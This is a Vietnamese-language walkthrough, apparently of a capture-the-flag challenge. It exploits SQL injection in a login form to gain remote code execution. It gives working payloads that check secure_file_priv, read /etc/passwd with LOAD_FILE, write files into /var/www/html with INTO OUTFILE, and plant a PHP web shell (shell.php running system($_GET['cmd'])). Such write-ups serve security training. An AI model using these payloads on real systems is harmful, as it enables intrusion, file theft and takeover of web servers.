
Trước tiên cần kiểm tra xem , trong MYSQL chúng ta có quyền được thực hiện việc ghi file hay không ? Nhưng bởi vì , nếu có kết quả truy vấn trả về thì nó sẽ báo login thành công . Còn không có thì sẽ báo login thất bại . Vậy nên ở đây chúng ta sẽ phải dùng Boolean based để kiểm tra xem biến `secure_file_priv` có rỗng hay không , hoặc là có bằng với `/var/www/html` hay không bằng cách kết hợp với or 

```sql
' or (select @@secure_file_priv)="" -- -
```
Hoặc nếu nó có thể không bằn rỗng thì bạn có thể fuzz bằng cách vào trang `https://github.com/osamahamad/FUZZING/tree/main/File%20Inclusion` tải các file liên quan đến path của Linux về và add to instruder để check xem , rồi dựa vào Length Response để xác định được những folder nào được quyền ghi file vào trong

<img width="1491" height="566" alt="image" src="https://github.com/user-attachments/assets/860541d5-35f0-4c07-9cb7-a3d3d183149f" />

Và kết quả là chúng ta nhận được login thành công tức là `secure_file_priv` nó bằng rỗng , điều kiện đúng => Trong MySQL chúng ta có quyền thực hiện ghi file

Tiếp theo cần kiểm tra xem chúng ta có quyền FILE hay không . Bởi vì quyền FILE nó bao gồm hàm `LOAD_FILE` ở trong đó , nếu chúng ta thử dùng hàm LOAD_FILE đọc 1 file luôn tồn tại trong hệ thống xem thử nếu mà hàm LOAD_FILE hoạt động được và đọc được nội dung bên trong etc/passwd rồi chúng ta dùng hàm `IS NOT NULL` để kiểm tra xem LOAD_FILE có trả về kiểu dữ liệu hay không 

Payload
```sql
' or (select LOAD_FILE('/etc/passwd')) IS NOT NULL -- -
```
<img width="1494" height="503" alt="image" src="https://github.com/user-attachments/assets/ce97b635-a495-42ba-a25b-1dd9f30535f2" />

Vậy tức là chúng ta có có được quyền FILE . Cuối cùng cần check xem có quyền ghi file vào trong folder `/var/www/html` trên hđh Linux hay không . Lúc nãy là check xem có thể thực hiện hành động ghi file ở trong MySQL hay không, còn giờ là có quyền ghi file ở trên hđh Linux hay không, bạn cần phân biệt điều đó . Chúng ta thử chèn 1 file test.txt vào trong `/var/www/html` 
```sql
' UNION SELECT "test", 3, 4 INTO OUTFILE '/var/www/html/test.txt' -- -
```
<img width="1487" height="558" alt="image" src="https://github.com/user-attachments/assets/2bd9da46-e080-4b5e-b587-4557907e0910" />

Và kết quả là chúng ta có thể ghi file vào trong `/var/www/html` . Bởi vì , Nó báo login thất bại chứ nó không hề báo lỗi Permission denied hay lỗi hệ thống nào cả . Login thất bại là bởi vì câu lệnh phía sau là chúng ta đang chèn file vào folder nên không có bất kì kết quả nào được trả về từ truy vấn cả 

Và cũng tương tự như trên nếu muốn biết thêm folder nào được quyền ghi file vào thì , chúng ta add vào 1 list fuzz path của hđh Linux , rồi add to instruder của burpsuite , thay cái list path đấy vào chỗ của `/var/www/html` rồi dựa vào kết quả trả về ,  nếu không có quyền ghi file vào folder thì nó sẽ báo Permission denied hoặc sẽ gặp lỗi hệ thống chứ không phải là báo login thất bại 

Vào thử lại `/test.txt` thì nó có hiện ra nội dung chúng ta chèn vào lúc nãy 

<img width="581" height="171" alt="image" src="https://github.com/user-attachments/assets/38bcbf1f-61a6-49af-ad04-b529d1be82da" />


Bây giờ xác nhận được rằng , Challenge này hoàn toàn có thể RCE được , chúng ta đã có đủ 3 điều kiện : quyền thực hiện hành động ghi file trên MySQL , quyền thực hiện hành động ghi file trên Linux , và quyền FILE để được dùng lệnh `SELECT ... INTO OUTFILE ...` . CHúng ta hãy thử RCE thử xem 
```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>",3,4 INTO OUTFILE '/var/www/html/shell.php' -- -
```

<img width="1492" height="534" alt="image" src="https://github.com/user-attachments/assets/f3e3023c-7c4a-423e-9cfe-8bd9874599b1" />

Và `/shell.php?cmd=ls -la`

<img width="1920" height="195" alt="image" src="https://github.com/user-attachments/assets/3217a3d5-7eea-4253-a763-20aeb1df5847" />



